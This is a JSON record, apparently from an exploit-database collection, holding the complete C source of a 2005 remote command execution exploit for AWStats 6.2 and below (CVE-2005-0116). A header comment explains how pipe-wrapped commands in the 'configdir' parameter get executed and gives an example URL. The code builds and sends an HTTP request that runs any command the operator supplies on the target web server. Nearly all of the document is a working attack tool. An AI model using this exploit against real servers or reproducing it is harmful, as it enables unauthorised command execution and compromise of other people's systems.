{
  "id": "772",
  "title": "AWStats 6.0 &lt; 6.2 - &#039;configdir&#039; Remote Command Execution",
  "cve": "CVE-2005-0116",
  "vuln_type": "unknown",
  "code": "/*\r\nAwStats exploit by Thunder, molnar_rcs@yahoo.com\r\n\r\nThis exploit makes use of the remote command execution bug discovered in\r\nAwStats ver 6.2 and below. The bug resides in the awstats.pl perl script.\r\nThe script does not sanitise correctly the user input for the\r\n`configdir` parameter. If the users sends a command prefixed and postfixed\r\nwith | , the command will be executed. An example would be:\r\n\r\nLet's execute '/usr/bin/w':\r\n>\r\nhttp://localhost/cgi-bin/awstats.pl?configdir=%20|%20/usr/bin/w%20|%20\r\n<\r\n\r\nAwstat output:\r\n>\r\nError: LogFile parameter is not defined in config/domain file\r\nSetup (' | /usr/bin/w | /awstats.localhost.conf' file, web server or permissions) may be wrong.\r\nCheck config file, permissions and AWStats documentation (in 'docs' directory).\r\n<\r\n\r\nThat's it. Our command was executed.\r\nThis bug is fixed in AwStats ver 6.3 and a patch was released for all versions, but vulnerable\r\nAwStat is still available for download on several sites (ex. www.topshareware.com).\r\n\r\nType `gcc awexpl.c - o awexpl` to compile the exploit and `./awexpl -u` for usage.\r\n\r\nNote:\r\nJust indexing the commands with | will not always work, or might not work at all. I checked\r\nit on my own awstats 6.0 install, and it failed. So, whoever tried the same on his own\r\nscript and was surprised to see that (although the version he uses is said to be prone to the\r\nremote command execution bug) nothing happened, should patch or upgrade to Awstat 6.3 asap.\r\nAs far as i know all unpached versions prior to 6.3 are vulnerable and commands prefixed and\r\npostfixed by a | character WILL be executed. Beware!\r\n\r\nOh, I almost forgot, the disclaimer :)\r\n\r\nTHIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY* IT IS PROVIDED \"AS IS\"\r\nAND WITHOUT ANY WARRANTY.\r\n\r\nRobert Molnar,\r\n21th jan 2005\r\n*/\r\n\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <sys/types.h>\r\n#include <sys/socket.h>\r\n//#include <unistd.h>\r\n#include <arpa/inet.h>\r\n#include <string.h>\r\n\r\nvoid usage(char *pname)\r\n{\r\nprintf(\"# AWStats exploit by Thunder, molnar_rcs@yahoo.com\\n\"\r\n\"# Usage: %s -h <host> -i <ip> [-s Script] [-p Path] [-o Port] [-c Commands] [-u]\\n\"\r\n\"\\t-h : target host name, default is `localhost`\\n\"\r\n\"\\t-i : target IP (to wich host name resolvs)\\n\"\r\n\"\\t-s : script name, default is `awstats.pl`\\n\"\r\n\"\\t-p : script path, default is `/cgi-bin`\\n\"\r\n\"\\t-o : specify port to connect to, default is `80`\\n\"\r\n\"\\t-c : specify commands to be executed, the exploit will create a\\n\"\r\n\"\\t : file named `OWNED` in `/tmp` by default\\n\"\r\n\"\\t-u : usage\\n\\n\"\r\n\"# Example: %s -h localhost -i 127.0.0.1\\n\"\r\n\"# : %s -h localhost -i 127.0.0.1 -p /~user/cgi-bin\\n\"\r\n\"# : %s -h localhost -i 127.0.0.1 -p /~user/cgi-bin -c \\\"/usr/bin/id\\\"\\n\"\r\n, pname, pname, pname, pname);\r\n\r\nexit(0);\r\n}\r\n\r\nchar * urlEncode(char *inC)\r\n{\r\nint c, i, j = 0;\r\nchar *h = \"0123456789abcdef\";\r\nchar retval[1024], res[3072];\r\nmemcpy(retval, inC, strlen(inC));\r\nretval[strlen(inC)] = '\\0';\r\nfor(i=0; i < strlen(inC); i++){\r\nc = retval[i];\r\nif( 'a' <= c && c <= 'z'\r\n|| 'A' <= c && c <= 'Z'\r\n|| '0' <= c && c <= '9'\r\n|| c == '-' || c == '_' || c == '.')\r\nres[j++] = c;\r\nelse {\r\nres[j++] = '%';\r\nres[j++] = h[c >> 4];\r\nres[j++] = h[c & 0x0f];\r\n}\r\n}\r\nreturn res;\r\n\r\n}\r\n\r\n\r\nchar *buildHeader(char *Xhost, char *Xpath,char *Xscript, char *exeCmd)\r\n{\r\nchar Header[5196];\r\n\r\nsprintf( Header,\r\n\"GET %s/%s?configdir=%s HTTP/1.1\\r\\n\"\r\n\"Accept: text/xml,application/xml,application/xhtml+xml,\"\r\n\"text/html;q=0.9,text/plain;q=0.8,video/x-mng,image/png,\"\r\n\"image/jpeg,image/gif;q=0.2,text/css,*/*;q=0.1\\r\\n\"\r\n\"Accept-Language: en-us\\r\\n\"\r\n\"Accept-Encoding: deflate, gzip\\r\\n\"\r\n\"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts)\\r\\n\"\r\n\"Host: %s\\r\\n\"\r\n\"Connection: Keep-Alive\\r\\n\"\r\n\"Cache-Control: no-cache\\r\\n\"\r\n\"\\r\\n\"\r\n, Xpath, Xscript, urlEncode(exeCmd), Xhost );\r\nreturn Header;\r\n}\r\n\r\n\r\nvoid exploit(char *Xhost, char *Xpath,char *Xscript, char *exeCmd, char *Xip, int Xport)\r\n{\r\nint sock, disp = 0, count = 0;\r\nstruct sockaddr_in sockaddrX;\r\nchar *oData, iData;\r\n\r\nprintf(\"# AWStats Exploit by Thunder, molnar_rcs@yahoo.com\\n\");\r\nsockaddrX.sin_port = htons(Xport);\r\nsockaddrX.sin_family = AF_INET;\r\nsockaddrX.sin_addr.s_addr = inet_addr(Xip);\r\nif(Xhost == \"localhost\")\r\n{\r\nprintf(\"# Using hardcoded (default) options, use `-u` for usage\\n\"\r\n);\r\n}\r\nprintf(\"# Connecting to %s (%s) ...\", Xhost, Xip);\r\nsock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);\r\nif (connect(sock, (struct sockaddr*)&sockaddrX, 16) < 0)\r\n{\r\nprintf(\"\\n# Connect to %s (%s) on port %i failed!\\n\", Xhost, Xip, Xport);\r\nexit(-1);\r\n}\r\nprintf(\"Done!\\n# Building header...\");\r\noData = buildHeader(Xhost, Xpath, Xscript, exeCmd);\r\nprintf(\"Done!\\n# Sending data...\");\r\nsend(sock, oData, strlen(oData), 0);\r\n\r\n/* the code below reads the server response byte by byte, this is not needed\r\nwhile(read(sock, &iData, 1))\r\nputchar(iData);\r\n*/\r\nprintf(\"Done!\\n# Exploit finished.\\n\");\r\nclose(sock);\r\n}\r\n\r\n\r\n\r\n\r\n\r\nint main(int argc, char * argv[])\r\n{\r\nextern char *optarg;\r\nextern int optind, optopt;\r\n\r\nint c,\r\nXport = 80,\r\nisgood = 0;\r\n\r\nchar *Xhost = \"localhost\" ,\r\n*Xip = \"127.0.0.1\",\r\n*Xscript = \"awstats.pl\",\r\n*Xpath = \"/cgi-bin\";\r\n\r\nchar exeCmd[1024] = \"| echo \\\"You have been Owned, update AWstat or patch\\\" > /tmp/OWNED | \";\r\n\r\nwhile ((c = getopt(argc, argv, \":uh:i:s:p:c:o:\")) != -1)\r\n{\r\n\r\nswitch(c)\r\n{\r\ncase 'h':\r\nXhost = optarg;\r\nisgood++;\r\nbreak;\r\n\r\ncase 'i':\r\nXip = optarg;\r\nisgood++;\r\nbreak;\r\n\r\ncase 's':\r\nXscript = optarg;\r\nbreak;\r\n\r\ncase 'p':\r\nXpath = optarg;\r\nbreak;\r\n\r\ncase 'c':\r\nif(strlen(optarg) > 1018)\r\n{\r\nprintf(\"# `-c` argument can't exceed 1024 bytes (command to long)\");\r\nexit(0);\r\n}\r\nsprintf(exeCmd, \" | %s | \", optarg);\r\nbreak;\r\n\r\ncase 'o':\r\nXport = atoi(optarg);\r\nbreak;\r\n\r\ncase 'u':\r\nusage(argv[0]);\r\nbreak;\r\n\r\ncase '?':\r\nprintf(\"# Unknown option `-%c`\\n\", optopt);\r\nbreak;\r\n\r\n\r\n}\r\n}\r\n\r\n\r\nif( isgood == 1)\r\n{\r\nprintf(\"# Please specify both host `-h` and ip `-i`\\n\");\r\nexit(0);\r\n}\r\n\r\nexploit(Xhost, Xpath, Xscript, exeCmd, Xip, Xport);\r\nreturn 0;\r\n}\r\n\r\n// milw0rm.com [2005-01-25]",
  "url": "https://www.exploit-db.com/exploits/772"
}